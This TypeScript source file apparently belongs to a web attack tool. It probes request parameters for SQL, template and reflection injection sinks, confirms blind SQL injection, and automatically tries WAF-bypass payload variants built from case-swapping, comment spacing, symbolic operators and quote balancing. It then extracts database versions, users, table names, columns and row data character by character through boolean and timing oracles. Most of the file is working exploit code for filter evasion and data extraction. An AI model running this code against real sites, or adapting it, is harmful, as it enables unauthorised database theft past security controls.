/** Blind Differential Oracle — calibration-based blind-vuln detection.
 *
 *  Detects which sink a request parameter reaches WITHOUT sending a malicious
 *  payload. The technique is CALIBRATION + DIFFERENTIAL: send a baseline, then
 *  benign ARITHMETIC / encoding variants, and infer the sink from the byte-level
 *  response difference.
 *
 *    SQL/expression : `id=1` vs `id=1+0` / `id=2-1` — if the same record comes
 *                     back, the param is evaluated arithmetically (SQL context).
 *    SSTI           : `name=test` vs `name=test${7*7}` — if "49" renders, the
 *                     param reaches a template engine.
 *    XSS reflection : a unique marker `<zzMARK>` — if it reflects RAW, the param
 *                     reaches unescaped HTML output.
 *
 *  All probes are benign (numbers + operators, no quotes/commands), so they do
 *  not trigger WAF — yet the differential is a deterministic, evidence-backed
 *  signal. Pure helpers (probe generation + inference) are unit-testable.
 */
import { sha256 } from "./evidence.js";
import { blindSqli } from "./blind-sqli.js";

export interface Probe {
  sink: string;
  name: string;
  payload: string;
}

/** Benign arithmetic/coercion probes (only for numeric baselines). */
export function arithmeticProbes(value: string): Probe[] {
  const n = Number(value);
  if (Number.isNaN(n) || value.trim() === "") return [];
  return [
    { sink: "sql_arithmetic", name: "plus_zero", payload: `${n}+0` },
    { sink: "sql_arithmetic", name: "minus_zero", payload: `${n}-0` },
    { sink: "sql_arithmetic", name: "times_one", payload: `${n}*1` },
    { sink: "sql_coercion", name: "leading_zero", payload: `0${value}` },
    { sink: "sql_coercion", name: "float_form", payload: `${n}.0` },
  ];
}

/** Benign SSTI arithmetic probes (the engine renders 7*7 = 49 if templated). */
export function sstiProbes(value: string): Probe[] {
  return [
    { sink: "ssti", name: "dollar_math", payload: `${value}\${7*7}` },
    { sink: "ssti", name: "hash_math", payload: `${value}#{7*7}` },
    { sink: "ssti", name: "mustache_math", payload: `${value}{{7*7}}` },
  ];
}

/** Error-based SQLi probes — a trailing quote breaks the query when the param is
 *  interpolated into a SQL string, producing a server error where the bare value
 *  succeeded. Benign (just a quote); the differential is the ERROR (status/size). */
export function quoteProbes(value: string): Probe[] {
  return [
    { sink: "sql_error", name: "single_quote", payload: `${value}'` },
    { sink: "sql_error", name: "double_quote", payload: `${value}"` },
  ];
}

/** Benign XSS reflection probe (a unique marker, no angle-bracket payload). */
export function xssProbe(value: string, marker: string): Probe {
  return { sink: "xss", name: "marker", payload: `${value}${marker}` };
}

/** Time-based blind probes — a delay payload whose TRUE branch sleeps (SLEEP /
 *  WAITFOR / pg_sleep / dbms_pipe / randomblob). Used when the boolean body is
 *  IDENTICAL (no byte-count differential) — only the TIMING reveals the sink.
 *  These carry a quote + delay function, so they are NOT benign: use them only
 *  AFTER the arithmetic probes already flagged SQL context. */
export function timeProbes(dbms: string, value: string): Probe[] {
  const p = blindSqli(dbms);
  if (!p) return [];
  return [
    { sink: "time", name: "time_true", payload: `${value}${p.oracle.time_true}` },
    { sink: "time", name: "time_false", payload: `${value}${p.oracle.time_false}` },
  ];
}

export interface BlindProbeResult {
  sink: string;
  name: string;
  payload: string;
  status: number;
  size: number;
  timing_ms: number;
  body_hash: string;
  same_as_baseline: boolean;
  signal: boolean;
  reason: string;
}

/** Pure inference: classify each probe result against the baseline. */
export function classifyBlindProbe(input: {
  baselineHash: string;
  baselineSize: number;
  baselineStatus: number;
  bodyHash: string;
  size: number;
  status: number;
  sink: string;
  name: string;
  body: string;
  marker?: string;
}): { same_as_baseline: boolean; signal: boolean; reason: string } {
  const same = input.bodyHash === input.baselineHash;
  // Arithmetic/coercion "identity" is only meaningful when the baseline SUCCEEDED —
  // an error baseline (e.g. a file-include param where value=1 500s) must NOT be
  // read as "evaluated arithmetically" (false positive on non-SQL sinks).
  const baselineOk = input.baselineStatus >= 200 && input.baselineStatus < 400;
  let signal = false;
  let reason = "";

  if (input.sink === "sql_arithmetic" && same && baselineOk) {
    signal = true;
    reason = "arithmetic identity returned the SAME result as the bare value (both succeeded) — the parameter is evaluated arithmetically (SQL/expression context).";
  } else if (input.sink === "sql_coercion" && same && baselineOk) {
    signal = true;
    reason = "type-coerced variant returned the SAME result — the parameter is normalized numerically (SQL typed column).";
  } else if (input.sink === "sql_error") {
    // A trailing quote turns a successful request into a server error — the param
    // is interpolated into a SQL string (error-based SQLi).
    if (baselineOk && input.status >= 500) {
      signal = true;
      reason = `a trailing quote triggered a server error (HTTP ${input.status}) while the bare value succeeded (HTTP ${input.baselineStatus}) — the parameter is interpolated into a SQL string (error-based SQLi).`;
    }
  } else if (input.sink === "ssti" && !same && /49/.test(input.body)) {
    // The arithmetic 7*7 rendered as 49 in a body that DIFFERS from the baseline.
    signal = true;
    reason = "the SSTI arithmetic (7*7) rendered as 49 in the response — the parameter reaches a template engine (SSTI).";
  } else if (input.sink === "xss" && input.marker && input.body.includes(input.marker)) {
    signal = true;
    reason = "the unique marker was reflected in the response — the parameter reaches HTML output (reflected).";
  }
  return { same_as_baseline: same, signal, reason };
}

export async function blindOracle(baseUrl: string, param: string, value: string, opts: { sinks?: string[]; timeoutMs?: number; timeDbms?: string } = {}): Promise<Record<string, unknown>> {
  const base = baseUrl; // use as-is — redirect:follow handles dir→dir/ (301) and .asp/.php file endpoints
  const sinks = opts.sinks ?? ["sql", "ssti", "xss"];
  const timeDbms = opts.timeDbms ?? "mysql";
  const marker = `zz${Math.random().toString(36).slice(2, 10)}zz`;
  const headers = { "User-Agent": "Mozilla/5.0 (blitzstrike oracle probe)" };
  const timeoutMs = opts.timeoutMs ?? 8000;

  const build = (payload: string) => `${base}?${encodeURIComponent(param)}=${encodeURIComponent(payload)}`;

  let baselineHash = "";
  let baselineSize = 0;
  let baselineStatus = 0;
  try {
    const r = await fetch(build(value), { headers, redirect: "follow", signal: AbortSignal.timeout(timeoutMs) });
    baselineStatus = r.status;
    const body = await r.text();
    baselineHash = sha256(body);
    baselineSize = body.length;
  } catch (e) {
    return { error: "baseline fetch failed", base_url: base, param, detail: String(e) };
  }

  const probes: Probe[] = [];
  if (sinks.includes("sql")) {
    probes.push(...arithmeticProbes(value));
    probes.push(...quoteProbes(value));
  }
  if (sinks.includes("ssti")) probes.push(...sstiProbes(value));
  if (sinks.includes("xss")) probes.push(xssProbe(value, marker));
  if (sinks.includes("time")) probes.push(...timeProbes(timeDbms, value));

  const results: Array<Record<string, unknown>> = [];
  for (const p of probes) {
    const t0 = Date.now();
    try {
      const r = await fetch(build(p.payload), { headers, redirect: "follow", signal: AbortSignal.timeout(timeoutMs) });
      const timing = Date.now() - t0;
      const status = r.status;
      const body = await r.text();
      const bodyHash = sha256(body);
      const cls = classifyBlindProbe({
        baselineHash, baselineSize, baselineStatus, bodyHash, size: body.length, status,
        sink: p.sink, name: p.name, body, marker,
      });
      let signal = cls.signal;
      let reason = cls.reason;
      if (p.sink === "time") {
        if (p.name === "time_true" && timing > 2000) {
          signal = true;
          reason = "time-based TRUE branch delayed the response (delay primitive fired) — blind SQLi confirmed via timing.";
        } else if (p.name === "time_false") {
          reason = timing < 2000 ? "FALSE branch returned instantly — the delay is conditional (clean time oracle)." : "FALSE branch also delayed — timing is not conditional (likely not a time oracle).";
        }
      }
      results.push({
        sink: p.sink, name: p.name, payload: p.payload, status,
        size: body.length, timing_ms: timing, body_hash: bodyHash.slice(0, 12),
        same_as_baseline: cls.same_as_baseline, signal, reason,
      });
    } catch {
      results.push({ sink: p.sink, name: p.name, payload: p.payload, status: 0, size: 0, timing_ms: 0, body_hash: "", same_as_baseline: false, signal: false, reason: "fetch error/timeout" });
    }
  }

  const signals = results.filter((r) => r.signal === true);

  return {
    base_url: base,
    param,
    value,
    baseline: { status: baselineStatus, size: baselineSize, body_hash: baselineHash.slice(0, 16) },
    probes_tested: results.length,
    signals_found: signals.length,
    signals,
    all: results,
    interpretation: "A signal means the parameter reaches that sink (evidence: the differential). Verify live before reporting — the oracle is a detection hint, not proof.",
  };
}

/** WAF-bypass + CONTEXT variants of an oracle payload — quote type (single /
 *  double / numeric / parenthesized), comment style (dash / # / quote-balance),
 *  space (space / `/**\/` / tab), and case. The confirm tool tries these in
 *  order when the default payload is filtered. COMBINED variants are required for
 *  stacked WAFs (e.g. space-strip breaks `-- -` → `---`, so `/**\/` + `#` is
 *  needed; a comment-strip WAF needs tab-as-space + quote-balance). */
function oracleBypassVariants(base: string): string[] {
  const body = base.replace(/^'/, "");   // strip leading quote → " AND 1=1-- -"
  const dash = body;
  const hash = body.replace(/-- -$/, "#").replace(/--$/, "#");
  const bal  = body.replace(/(\d)=(\d)-- -/, "'$1'='$2"); // quote-balance (boolean)
  // LIKE-based boolean oracle (bypasses a "=" filter): 1=1→'a' LIKE 'a, 1=2→'a' LIKE 'b
  const likeBool = body.replace(/(\d)=(\d)-- -/, (_, a, b) => (a === b ? "'a' LIKE 'a" : "'a' LIKE 'b"));
  const cs = (s: string) => s.replace(/AND/g, "aNd").replace(/OR/g, "oR").replace(/IF/g, "iF").replace(/SLEEP/g, "sLeEp");
  // symbolic-logical: AND→&& / OR→|| (bypasses keyword filters)
  const sym = (s: string) => s.replace(/AND/g, "&&").replace(/OR/g, "||");
  const sp = (s: string, x: string) => (x === " " ? s : s.replace(/ /g, x));

  const out: string[] = [];
  for (const cmt of [dash, hash, bal, likeBool]) {
    for (const x of [" ", "/**/", "\t", "\n", "\r"] as const) {
      out.push(`'${sp(cmt, x)}`);
      out.push(`'${sp(cs(cmt), x)}`);
      out.push(`'${sp(sym(cmt), x)}`);
    }
  }
  // other quote contexts (dash + hash, space only — bounded)
  out.push(`"${dash}`, dash, `')${dash}`, `")${dash}`, `"${hash}`, `')${hash}`, `")${hash}`);
  return out;
}

/** CONTEXT × function-name × space × comment × case variants of the SUBSTRING
 *  extraction template. COMBINED variants cover stacked WAFs: `/**\/`+`#` for
 *  space-strip, `\t`+balance for comment-strip, `/**\/`+case+`#` for
 *  space+keyword strip. */
function extractBypassVariants(tpl: string): string[] {
  const fn = tpl.includes("SUBSTRING") ? "SUBSTRING" : "SUBSTR";
  const fns = [fn, fn === "SUBSTRING" ? "sUbStRiNg" : "sUbStR", fn === "SUBSTRING" ? "SUBSTR" : "SUBSTRING", "MID"];
  const contexts = ["'", '"', "", "')", '")'];
  const out: string[] = [];
  for (const c of contexts) {
    const base = tpl.replace(/^'/, c);
    const dash = base;
    const hash = base.replace(/-- -$/, "#").replace(/--$/, "#");
    const bal  = base.replace(/'(-- -|--)$/, ""); // quote-balance (drop trailing quote+comment)
    const like = base.replace(/='\{char\}'/, "IN ('{char}')"); // equaltolike via IN (exact, no wildcard, no AND)
    const likeHash = like.replace(/-- -$/, "#").replace(/--$/, "#"); // IN + # comment
    // [template, space, mode] — mode: none | case-swap | sym(&&/||) | like
    const combos: Array<[string, string, string]> = [
      [dash, " ", "none"],      // default
      [hash, " ", "none"],      // # comment
      [dash, "/**/", "none"],   // comment-space
      [dash, " ", "case"],      // case-swap (fn + AND)
      [bal, " ", "none"],       // quote-balance
      [hash, "/**/", "none"],   // /**/ + #  (space-strip WAF)
      [hash, "/**/", "case"],   // /**/ + # + case  (space+keyword WAF)
      [hash, "\t", "case"],     // tab + # + case
      [bal, "\t", "case"],      // tab + balance + case  (expert WAF)
      [bal, "/**/", "case"],    // /**/ + balance + case
      [dash, "\n", "none"],     // LF (newline) space
      [hash, "\n", "case"],     // LF + # + case
      [bal, "\n", "case"],      // LF + balance + case
      [dash, " ", "sym"],       // AND→&&  (symbolic-logical)
      [like, " ", "none"],      // =→IN  (equaltolike)
      [like, "/**/", "none"],   // IN + /**/
      [likeHash, "\n", "sym"],  // LF + && + IN + #  (aggressive WAF)
      [likeHash, "\t", "sym"],  // tab + && + IN + #
      [like, "\n", "sym"],      // LF + && + IN
      [likeHash, " ", "sym"],   // && + IN + #
    ];
    for (const [cmt, s, mode] of combos) {
      let b = cmt;
      if (mode === "case") b = b.replace(fn, fns[1]).replace(/AND/g, "aNd");
      else if (mode === "sym") b = b.replace(/AND/g, "&&").replace(/OR/g, "||");
      if (s === "/**/") b = b.replace(/ /g, "/**/");
      else if (s !== " ") b = b.replace(/ /g, s);
      out.push(b);
    }
  }
  return out;
}

/** Fetch helper supporting GET (param in query), POST (param injected into a
 *  body template via the {value} placeholder), and COOKIE (payload injected into
 *  a Cookie header — e.g. TrackingId for analytics/session cookies). */
function makeFetcher(base: string, param: string, method: "GET" | "POST", bodyTpl: string | undefined, cookieName?: string) {
  const headers = { "User-Agent": "Mozilla/5.0 (blitzstrike)" };
  const send = async (payload: string): Promise<Response> => {
    if (cookieName) {
      return fetch(base, { headers: { ...headers, "Cookie": `${cookieName}=${payload}` }, redirect: "follow", signal: AbortSignal.timeout(9000) });
    }
    if (method === "POST") {
      const body = (bodyTpl ?? `${param}={value}`).replace("{value}", payload);
      return fetch(base, { method: "POST", headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" }, redirect: "follow", signal: AbortSignal.timeout(9000), body });
    }
    return fetch(`${base}?${encodeURIComponent(param)}=${encodeURIComponent(payload)}`, { headers, redirect: "follow", signal: AbortSignal.timeout(9000) });
  };
  return {
    async size(payload: string): Promise<number> {
      try { return (await (await send(payload)).text()).length; } catch { return -1; }
    },
    async body(payload: string): Promise<string> {
      try { return await (await send(payload)).text(); } catch { return ""; }
    },
    async time(payload: string): Promise<number> {
      const t0 = Date.now(); await this.size(payload); return Date.now() - t0;
    },
  };
}

/** Autonomous blind-SQLi CONFIRMATION — turns blindOracle's "SQL context" HINT
 *  into "blind SQLi CONFIRMED" with evidence. Sends the actual boolean + time
 *  oracle (payloads come from the blind_sqli playbook, NOT hand-written) and
 *  measures the byte-count + timing differential. When the default payload is
 *  filtered, it AUTO-TRIES WAF-bypass variants (comment/space/case/quote).
 *  confirmed=true only when a clean differential is observed. */
export async function confirmBlindSqli(baseUrl: string, param: string, value: string, dbms = "mysql", opts: { method?: "GET" | "POST"; body?: string; cookie?: string; marker?: string } = {}): Promise<Record<string, unknown>> {
  const base = baseUrl; // use as-is — redirect:follow handles dir→dir/ (301) and .asp/.php file endpoints
  const p = blindSqli(dbms);
  if (!p) return { error: `no blind-SQLi playbook for '${dbms}'`, known: ["mysql", "postgresql", "mssql", "oracle", "sqlite"] };
  const F = makeFetcher(base, param, opts.method ?? "GET", opts.body, opts.cookie);
  const marker = opts.marker ?? "";

  // boolean oracle: try the default then WAF-bypass variants until a clean
  // TRUE/FALSE differential appears (byte-count, or marker presence if provided).
  let boolDiff = false, bt = -1, bf = -1;
  let boolBypass: string | null = null;
  const btv = oracleBypassVariants(p.oracle.boolean_true);
  const bfv = oracleBypassVariants(p.oracle.boolean_false);
  for (let i = 0; i < btv.length; i++) {
    const tP = `${value}${btv[i]}`, fP = `${value}${bfv[i]}`;
    let diff = false, tN = -1, fN = -1;
    if (marker) {
      const tb = await F.body(tP), fb = await F.body(fP);
      diff = tb.includes(marker) !== fb.includes(marker);
      tN = tb.length; fN = fb.length;
    } else {
      const t = await F.size(tP), f = await F.size(fP);
      diff = t >= 0 && f >= 0 && t !== f; tN = t; fN = f;
    }
    if (diff) { boolDiff = true; bt = tN; bf = fN; boolBypass = i === 0 ? null : btv[i]; break; }
  }

  // time oracle: TRUE branch sleeps (~5s), FALSE branch is instant.
  let timeDiff = false, tt = 0, tf = 0;
  const ttv = oracleBypassVariants(p.oracle.time_true);
  const tfv = oracleBypassVariants(p.oracle.time_false);
  for (let i = 0; i < ttv.length; i++) {
    const t = await F.time(`${value}${ttv[i]}`);
    const f = await F.time(`${value}${tfv[i]}`);
    if (t > 2000 && f < 2000) { timeDiff = true; tt = t; tf = f; break; }
  }

  const confirmed = boolDiff || timeDiff;
  const channel = boolDiff && timeDiff ? "both" : boolDiff ? "boolean" : timeDiff ? "time" : null;

  return {
    dbms, param, value, method: opts.cookie ? `COOKIE:${opts.cookie}` : (opts.method ?? "GET"),
    boolean: { true_size: bt, false_size: bf, differential: boolDiff, bypass: boolBypass },
    time: { true_ms: tt, false_ms: tf, differential: timeDiff },
    confirmed,
    channel,
    bypass_used: boolBypass,
    evidence: confirmed
      ? `blind SQLi CONFIRMED via ${channel} differential — ` +
        (boolDiff ? `boolean TRUE=${bt}b vs FALSE=${bf}b${boolBypass ? ` (bypass: ${boolBypass})` : ""}` : "") +
        (boolDiff && timeDiff ? "; " : "") +
        (timeDiff ? `time TRUE≈${tt}ms vs FALSE≈${tf}ms` : "") + "."
      : "no clean boolean or time differential observed (tried default + WAF-bypass variants) — not confirmed as blind SQLi.",
  };
}

/** Resolve a metadata target to its SQL query expression (from the playbook). */
function resolveQueryExpr(p: ReturnType<typeof blindSqli>, target: string, opts: { table?: string; column?: string; index?: number }): string | null {
  const i = String(opts.index ?? 0);
  switch (target) {
    case "version": return p?.metadata.version[0] ?? null;
    case "database": return p?.metadata.current_db[0] ?? null;
    case "user": return p?.metadata.current_user[0] ?? null;
    case "tables": return p?.metadata.tables[0]?.replace("{i}", i) ?? null;
    case "columns": return p?.metadata.columns[0]?.replace("{t}", opts.table ?? "").replace("{i}", i) ?? null;
    case "data": return p?.metadata.data[0]?.replace("{t}", opts.table ?? "").replace("{c}", opts.column ?? "").replace("{i}", i) ?? null;
    default: return null;
  }
}

/** Autonomous blind-SQLi EXTRACTION — after blind_sqli_confirm confirms the
 *  oracle, this extracts a metadata value (version / database / user / tables /
 *  columns / data) one character at a time via the boolean or time oracle. The
 *  SUBSTRING payloads are generated from the playbook (NOT hand-written). */
export async function blindSqliExtract(
  baseUrl: string, param: string, value: string, dbms: string, target: string,
  opts: { channel?: "boolean" | "time"; table?: string; column?: string; index?: number; maxlen?: number; method?: "GET" | "POST"; body?: string; cookie?: string; marker?: string } = {}
): Promise<Record<string, unknown>> {
  const base = baseUrl; // use as-is — redirect:follow handles dir→dir/ (301) and .asp/.php file endpoints
  const p = blindSqli(dbms);
  if (!p) return { error: `no blind-SQLi playbook for '${dbms}'`, known: ["mysql", "postgresql", "mssql", "oracle", "sqlite"] };
  const queryExpr = resolveQueryExpr(p, target, opts);
  if (!queryExpr) return { error: `unknown target '${target}'`, known: ["version", "database", "user", "tables", "columns", "data"] };

  const F = makeFetcher(base, param, opts.method ?? "GET", opts.body, opts.cookie);
  const getSize = (payload: string) => F.size(payload);
  const getTime = (payload: string) => F.time(payload);
  const getBody = (payload: string) => F.body(payload);
  const marker = opts.marker ?? "";
  const maxlen = opts.maxlen ?? 64;

  // Discover the injection CONTEXT (quote type) + oracle reference.
  let channel: "boolean" | "time" = opts.channel ?? "boolean";
  const contexts = ["'", '"', "", "')", '")'];
  let ctx = "'";
  let trueSize = -1, falseSize = -1;
  let ctxFound = false;
  if (channel === "boolean") {
    // Try the default oracle THEN WAF-bypass variants (space/comment/case) per
    // context — a stacked WAF (space+keyword+comment strip) blocks the default
    // oracle, so the reference must be established via the variant that works.
    const btv = oracleBypassVariants(p.oracle.boolean_true);
    const bfv = oracleBypassVariants(p.oracle.boolean_false);
    for (let i = 0; i < btv.length; i++) {
      const tp = `${value}${btv[i]}`, fp = `${value}${bfv[i]}`;
      let diff = false, tN = -1, fN = -1;
      if (marker) {
        const tb = await getBody(tp), fb = await getBody(fp);
        diff = tb.includes(marker) !== fb.includes(marker);
        tN = tb.length; fN = fb.length;
      } else {
        const t = await getSize(tp), f = await getSize(fp);
        diff = t >= 0 && f >= 0 && t !== f; tN = t; fN = f;
      }
      if (diff) { ctx = "'"; trueSize = tN; falseSize = fN; ctxFound = true; break; }
    }
    if (!ctxFound) channel = "time"; // no boolean differential in any context
  }
  if (channel === "time") {
    for (const c of contexts) {
      const t = await getTime(`${value}${p.oracle.time_true.replace(/^'/, c)}`);
      const f = await getTime(`${value}${p.oracle.time_false.replace(/^'/, c)}`);
      if (t > 2000 && f < 2000) { ctx = c; break; }
    }
  }

  // Full charset for the LINEAR fallback. Includes SPACE (required for strings like
  // "Microsoft SQL Server 2012 (SP1)") + parens/comma. Deliberately EXCLUDES
  // WAF-sensitive chars (#, =, <, >, quotes, %, &, ;, |, *) — a WAF that strips one
  // of those turns the comparison into `= ''` (always-true past the string end),
  // producing a false trailing run. Space is placed LAST; the trailing space run
  // (MySQL `'' == ' '` past the end) is stripped by trimEnd below.
  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_/.-:@(), ";
  // ASCII-sorted charset for binary search. Case-INSENSITIVE collations
  // (mysql/mssql default) must use a lowercase-only set — otherwise 'A'=='a'
  // under the collation, the ordering is ambiguous, and binary search returns
  // wrong case (e.g. "SECURITy"). Case-sensitive DBMS keep the full ASCII set.
  const caseInsensitive = p.dbms === "mysql" || p.dbms === "mssql";
  const bsCharset = caseInsensitive
    ? "0123456789abcdefghijklmnopqrstuvwxyz"
    : "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  // render an extraction payload + check if it matches (with auto WAF-bypass).
  const baseTpl = (channel === "time" ? p.extraction.time : p.extraction.boolean).replace(/^'/, ctx);
  const render = (tpl: string, pos: number, ch: string) => {
    // The variant's space style (tab / /**/ / space) must ALSO apply to the query
    // expression's internal spaces — a space-strip WAF breaks `(SELECT secret FROM
    // flag LIMIT 1)` unless those spaces use the same bypass style as the template.
    const spaceStyle = tpl.includes("\t") ? "\t" : tpl.includes("\n") ? "\n" : tpl.includes("\r") ? "\r" : tpl.includes("/**/") ? "/**/" : " ";
    const q = spaceStyle === " " ? queryExpr : queryExpr.replace(/ /g, spaceStyle);
    return `${value}${tpl.replace(/\{query\}/g, q).replace(/\{pos\}/g, String(pos)).replace(/\{char\}/g, ch).replace(/\{sec\}/g, "1")}`;
  };
  // Boolean oracle: TEXT marker when provided (robust against baseline page-size
  // drift), otherwise NEAREST-reference byte-count (drift-tolerant within a stable
  // differential). Both beat exact byte equality on dynamic pages.
  const isTrue = async (tpl: string, pos: number, ch: string) => {
    if (channel === "time") return (await getTime(render(tpl, pos, ch))) > 600;
    if (marker) return (await getBody(render(tpl, pos, ch))).includes(marker);
    const s = await getSize(render(tpl, pos, ch));
    return s >= 0 && Math.abs(s - trueSize) <= Math.abs(s - falseSize);
  };

  // Auto-select the working function-name variant (default → case → alias → MID)
  // by probing the first character with each (context already fixed).
  const variants = extractBypassVariants(baseTpl);
  let tpl = variants[0];
  let tplBypass: string | null = null;
  for (const v of variants) {
    let ok = false;
    for (const ch of charset) { if (await isTrue(v, 1, ch)) { ok = true; break; } }
    if (ok) { tpl = v; tplBypass = v === baseTpl ? null : v; break; }
  }

  // Greater-than template for binary search (string comparison; the trailing `--`
  // already neutralizes the original closing quote in every playbook template).
  const gtTpl = tpl.replace(/='\{char\}'/, ">'{char}'");

  // Extract one character at `pos`: binary search over the sorted charset (≈6
  // requests), verify with equality, and fall back to a linear scan (for chars
  // outside bsCharset or case-insensitive collations).
  const extractChar = async (pos: number): Promise<string | null> => {
    let lo = 0, hi = bsCharset.length - 1;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if (await isTrue(gtTpl, pos, bsCharset[mid])) lo = mid + 1; else hi = mid;
    }
    const ch = bsCharset[lo];
    if (await isTrue(tpl, pos, ch)) return ch; // equality verify passed
    // fallback: linear scan over the full charset (specials + case-insensitive)
    for (const c of charset) { if (await isTrue(tpl, pos, c)) return c; }
    return null; // end of string — no char matched
  };

  let out = "";
  for (let pos = 1; pos <= maxlen; pos++) {
    const ch = await extractChar(pos);
    if (ch === null) break;
    out += ch;
  }
  // Strip any trailing space run (MySQL compares '' == ' ' past the string end,
  // so the linear fallback appends a false space run once the value is exhausted).
  out = out.trimEnd();

  // Byte-count boolean oracle (no text marker) can drift on dynamic remote pages —
  // if it extracted NOTHING, retry with the TIME oracle (deterministic, drift-proof).
  if (out.length === 0 && channel === "boolean" && !marker) {
    return await blindSqliExtract(baseUrl, param, value, dbms, target, { ...opts, channel: "time" });
  }

  return {
    dbms, target, channel, query: queryExpr, context: ctx,
    extracted: out,
    char_count: out.length,
    bypass_used: tplBypass,
    evidence: out.length > 0
      ? `extracted '${target}' = ${JSON.stringify(out)} via ${channel} oracle (${out.length} chars${tplBypass ? `; function bypass: ${tplBypass}` : ""}).`
      : `no characters matched for '${target}' — the oracle may be dead for this query or the value is empty.`,
  };
}
